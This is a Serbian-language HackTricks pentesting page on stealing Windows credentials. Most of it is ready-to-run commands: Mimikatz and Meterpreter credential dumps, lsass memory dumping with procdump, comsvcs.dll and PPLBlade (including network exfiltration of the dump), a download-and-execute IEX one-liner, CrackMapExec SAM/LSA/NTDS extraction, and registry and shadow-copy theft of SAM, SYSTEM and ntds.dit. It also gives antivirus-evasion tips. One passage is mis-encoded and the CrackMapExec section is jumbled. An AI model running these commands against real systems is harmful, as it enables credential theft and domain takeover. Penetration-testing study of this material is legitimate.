# Kraƒëa Windows Kredencijala

<details>

<summary><strong>Nauƒçite AWS hakovanje od poƒçetnika do eksperta sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naƒçini da podr≈æite HackTricks:

* Ako ≈æelite da vidite svoju **kompaniju reklamiranu na HackTricks** ili **preuzmete HackTricks u PDF formatu** pogledajte [**PRETPLATNIƒåKE PLANOVE**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove podno≈°enjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Kredencijali Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Pronaƒëite druge stvari koje Mimikatz mo≈æe da uradi na** [**ovoj stranici**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Saznajte vi≈°e o moguƒáim za≈°titama za akreditive ovde.**](credentials-protections.md) **Ove za≈°tite mogu spreƒçiti Mimikatz da izvuƒçe neke akreditive.**

## Akreditive sa Meterpreter-om

Koristite [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **koji** sam kreirao da **tra≈æite lozinke i hash-eve** unutar ≈ærtve.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Zaobila≈æenje AV-a

### Procdump + Mimikatz

Kako je **Procdump iz** [**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) **legitiman Microsoft alat**, Defender ga ne detektuje.\
Mo≈æete koristiti ovaj alat da **izvr≈°ite dump lsass procesa**, **preuzmete dump** i **izvuƒçete** **poverljive podatke lokalno** iz dump-a.

{% code title="Dump lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="Extract credentials from the dump" %}

{% endcode %}

{% code title="Extract credentials from the dump" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

Ovaj proces se automatski obavlja pomoƒáu [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Napomena**: Neki **AV** mogu **detektovati** kao **maliciozno** kori≈°ƒáenje **procdump.exe za dump lsass.exe**, jer **detektuju** stringove **"procdump.exe" i "lsass.exe"**. Zato je **diskretnije** **proslediti** kao **argument** **PID** lsass.exe procdump-u **umesto** imena lsass.exe.

### Dumping lsass sa **comsvcs.dll**

DLL pod nazivom **comsvcs.dll** koji se nalazi u `C:\Windows\System32` je odgovoran za **dumpovanje memorije procesa** u sluƒçaju pada. Ovaj DLL ukljuƒçuje **funkciju** pod nazivom **`MiniDumpW`**, koja je dizajnirana da se poziva pomoƒáu `rundll32.exe`.\
Nije bitno koristiti prva dva argumenta, ali treƒái je podeljen na tri komponente. Prva komponenta je ID procesa koji se dump-uje, druga komponenta je lokacija dump fajla, a treƒáa komponenta je striktno reƒç **full**. Ne postoje alternativne opcije.\
Nakon parsiranja ove tri komponente, DLL se anga≈æuje u kreiranju dump fajla i prebacivanju memorije specificiranog procesa u ovaj fajl.\
Kori≈°ƒáenje **comsvcs.dll** je izvodljivo za dumpovanje lsass procesa, ƒçime se elimini≈°e potreba za upload-om i izvr≈°avanjem procdump-a. Ova metoda je detaljno opisana na [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Sledeƒáa komanda se koristi za izvr≈°enje:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Mo≈æete automatizovati ovaj proces sa** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumpovanje lsass sa Task Manager-om**

1. Desni klik na Task Bar i kliknite na Task Manager
2. Kliknite na More details
3. Pretra≈æite proces "Local Security Authority Process" u tabu Processes
4. Desni klik na proces "Local Security Authority Process" i kliknite na "Create dump file".

### Dumpovanje lsass sa procdump-om

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) je Microsoft potpisani binarni fajl koji je deo [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite-a.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) —ò–µ –∞–ª–∞—Ç –∑–∞ –∑–∞—à—Ç–∏—õ–µ–Ω–æ –ø—Ä–æ—Ü–µ—Å–Ω–æ –¥–∞–º–ø–æ–≤–∞—ö–µ –∫–æ—ò–∏ –ø–æ–¥—Ä–∂–∞–≤–∞ –æ–±—Ñ—É—Å–∫–∞—Ü–∏—ò—É –º–µ–º–æ—Ä–∏—ò—Å–∫–æ–≥ –¥–∞–º–ø–∞ –∏ –ø—Ä–µ–Ω–æ—Å –Ω–∞ —É–¥–∞—ô–µ–Ω–µ —Ä–∞–¥–Ω–µ —Å—Ç–∞–Ω–∏—Ü–µ –±–µ–∑ –∑–∞–ø–∏—Å–∏–≤–∞—ö–∞ –Ω–∞ –¥–∏—Å–∫.

**–ö—ô—É—á–Ω–µ —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª–Ω–æ—Å—Ç–∏**:

1. –ó–∞–æ–±–∏–ª–∞–∂–µ—ö–µ PPL –∑–∞—à—Ç–∏—Ç–µ
2. –û–±—Ñ—É—Å–∫–∞—Ü–∏—ò–∞ –º–µ–º–æ—Ä–∏—ò—Å–∫–∏—Ö –¥–∞–º–ø —Ñ–∞—ò–ª–æ–≤–∞ —Ä–∞–¥–∏ –∏–∑–±–µ–≥–∞–≤–∞—ö–∞ Defender –º–µ—Ö–∞–Ω–∏–∑–∞–º–∞ –¥–µ—Ç–µ–∫—Ü–∏—ò–µ –∑–∞—Å–Ω–æ–≤–∞–Ω–∏—Ö –Ω–∞ –ø–æ—Ç–ø–∏—Å–∏–º–∞
3. –û—Ç–ø—Ä–µ–º–∞—ö–µ –º–µ–º–æ—Ä–∏—ò—Å–∫–æ–≥ –¥–∞–º–ø–∞ —Å–∞ RAW –∏ SMB –º–µ—Ç–æ–¥–∞–º–∞ –æ—Ç–ø—Ä–µ–º–∞—ö–∞ –±–µ–∑ –∑–∞–ø–∏—Å–∏–≤–∞—ö–∞ –Ω–∞ –¥–∏—Å–∫ (–¥–∞–º–ø –±–µ–∑ —Ñ–∞—ò–ª–æ–≤–∞)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets

### Kori≈°ƒáenje mimikatz

```shell
mimikatz # sekurlsa::logonpasswords
```

### Kori≈°ƒáenje procdump

```shell
procdump -accepteula -ma lsass.exe lsass.dmp
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

### Kori≈°ƒáenje comsvcs

```shell
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 1234 C:\Windows\Temp\lsass.dmp full
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

### Kori≈°ƒáenje Task Manager

1. Otvorite Task Manager
2. Desni klik na `lsass.exe` proces
3. Kliknite na `Create dump file`
4. Kopirajte .dmp fajl na sistem sa mimikatz
5. Uƒçitajte .dmp fajl u mimikatz

```shell
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

### Kori≈°ƒáenje Process Explorer

1. Otvorite Process Explorer
2. Desni klik na `lsass.exe` proces
3. Kliknite na `Create Dump` > `Create Full Dump`
4. Kopirajte .dmp fajl na sistem sa mimikatz
5. Uƒçitajte .dmp fajl u mimikatz

```shell
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Izdvajanje NTDS.dit sa ciljanog DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Izdvajanje NTDS.dit istorije lozinki sa ciljanog DC-a
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Prika≈æi atribut pwdLastSet za svaki NTDS.dit nalog
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Kraƒëa SAM & SYSTEM

Ovi fajlovi bi trebalo da budu **locirani** u _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM._ Ali **ne mo≈æete ih jednostavno kopirati na uobiƒçajen naƒçin** jer su za≈°tiƒáeni.

### Iz Registra

Najlak≈°i naƒçin da ukradete ove fajlove je da dobijete kopiju iz registra:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Preuzmite** te fajlove na va≈°u Kali ma≈°inu i **izvucite hash-eve** koristeƒái:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Mo≈æete izvr≈°iti kopiranje za≈°tiƒáenih fajlova koristeƒái ovu uslugu. Morate biti Administrator.

#### Kori≈°ƒáenje vssadmin

vssadmin binarni fajl je dostupan samo u Windows Server verzijama
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ali mo≈æete isto uraditi iz **Powershell**-a. Ovo je primer **kako kopirati SAM fajl** (kori≈°ƒáeni hard disk je "C:" i fajl je saƒçuvan u C:\users\Public) ali mo≈æete koristiti ovo za kopiranje bilo kog za≈°tiƒáenog fajla:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Na kraju, mo≈æete koristiti i [**PS skriptu Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) da napravite kopiju SAM, SYSTEM i ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Datoteka **NTDS.dit** je poznata kao srce **Active Directory**, koja sadr≈æi kljuƒçne podatke o korisniƒçkim objektima, grupama i njihovim ƒçlanstvima. Tu se ƒçuvaju **hashovi lozinki** za domenske korisnike. Ova datoteka je baza podataka **Extensible Storage Engine (ESE)** i nalazi se na **_%SystemRoom%/NTDS/ntds.dit_**.

Unutar ove baze podataka, odr≈æavaju se tri glavne tabele:

- **Data Table**: Ova tabela je zadu≈æena za ƒçuvanje detalja o objektima kao ≈°to su korisnici i grupe.
- **Link Table**: Prati odnose, kao ≈°to su ƒçlanstva u grupama.
- **SD Table**: **Sigurnosni deskriptori** za svaki objekat se ƒçuvaju ovde, osiguravajuƒái sigurnost i kontrolu pristupa za pohranjene objekte.

Vi≈°e informacija o ovome: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows koristi _Ntdsa.dll_ za interakciju sa tom datotekom i koristi ga _lsass.exe_. Zatim, **deo** datoteke **NTDS.dit** mo≈æe biti lociran **unutar memorije `lsass`** (mo≈æete pronaƒái najnovije pristupane podatke verovatno zbog pobolj≈°anja performansi kori≈°ƒáenjem **ke≈°a**).

#### De≈°ifrovanje hashova unutar NTDS.dit

Hash je ≈°ifrovan 3 puta:

1. De≈°ifrujte kljuƒç za ≈°ifrovanje lozinke (**PEK**) koristeƒái **BOOTKEY** i **RC4**.
2. De≈°ifrujte **hash** koristeƒái **PEK** i **RC4**.
3. De≈°ifrujte **hash** koristeƒái **DES**.

**PEK** ima **istu vrednost** u **svakom kontroleru domena**, ali je **≈°ifrovan** unutar datoteke **NTDS.dit** koristeƒái **BOOTKEY** iz **SYSTEM datoteke kontrolera domena (razlikuje se izmeƒëu kontrolera domena)**. Zbog toga, da biste dobili kredencijale iz NTDS.dit datoteke, **potrebne su vam datoteke NTDS.dit i SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Kopiranje NTDS.dit koristeƒái Ntdsutil

Dostupno od Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Takoƒëe mo≈æete koristiti trik sa [**volume shadow copy**](./#stealing-sam-and-system) da kopirate **ntds.dit** fajl. Zapamtite da ƒáe vam takoƒëe trebati kopija **SYSTEM file** (opet, [**izvadite ga iz registra ili koristite volume shadow copy**](./#stealing-sam-and-system) trik).

### **Ekstrakcija hash-eva iz NTDS.dit**

Kada ste **dobavili** fajlove **NTDS.dit** i **SYSTEM**, mo≈æete koristiti alate kao ≈°to je _secretsdump.py_ da **izvuƒçete hash-eve**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Takoƒëe mo≈æete **automatski ih izvuƒái** koristeƒái validnog domen admin korisnika:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Za **velike NTDS.dit fajlove** preporuƒçuje se ekstrakcija koristeƒái [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Na kraju, mo≈æete koristiti i **metasploit modul**: _post/windows/gather/credentials/domain\_hashdump_ ili **mimikatz** `lsadump::lsa /inject`

### **Ekstrakcija domen objekata iz NTDS.dit u SQLite bazu podataka**

NTDS objekti mogu biti ekstrahovani u SQLite bazu podataka pomoƒáu [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Ne samo da se tajne ekstrahuju, veƒá i ƒçitavi objekti i njihovi atributi za dalju ekstrakciju informacija kada je sirovi NTDS.dit fajl veƒá preuzet.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive je opcionalan, ali omoguƒáava de≈°ifrovanje tajni (NT & LM hash-evi, dopunske akreditive kao ≈°to su lozinke u ƒçistom tekstu, kerberos ili trust kljuƒçevi, NT & LM istorije lozinki). Pored ostalih informacija, sledeƒái podaci se izvlaƒçe: korisniƒçki i ma≈°inski nalozi sa njihovim hash-evima, UAC zastavice, vremenska oznaka za poslednju prijavu i promenu lozinke, opisi naloga, imena, UPN, SPN, grupe i rekurzivna ƒçlanstva, stablo organizacionih jedinica i ƒçlanstvo, pouzdani domeni sa tipom poverenja, smerom i atributima...

## Lazagne

Preuzmite binarni fajl sa [ovde](https://github.com/AlessandroZ/LaZagne/releases). Mo≈æete koristiti ovaj binarni fajl za ekstrakciju akreditiva iz nekoliko softvera.
```
lazagne.exe all
```
## Ostali alati za ekstrakciju kredencijala iz SAM i LSASS

### Windows credentials Editor (WCE)

Ovaj alat mo≈æe se koristiti za ekstrakciju kredencijala iz memorije. Preuzmite ga sa: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Ekstrakcija kredencijala iz SAM fajla
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Ekstraktujte kredencijale iz SAM fajla
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Preuzmite ga sa: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) i samo ga **pokrenite** i lozinke ƒáe biti izvuƒçene.

## Odbrane

[**Saznajte vi≈°e o za≈°titi kredencijala ovde.**](credentials-protections.md)

<details>

<summary><strong>Nauƒçite AWS hakovanje od poƒçetnika do eksperta sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naƒçini da podr≈æite HackTricks:

* Ako ≈æelite da vidite svoju **kompaniju reklamiranu na HackTricks** ili **preuzmete HackTricks u PDF formatu** pogledajte [**PRETPLATNE PLANOVE**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove podno≈°enjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
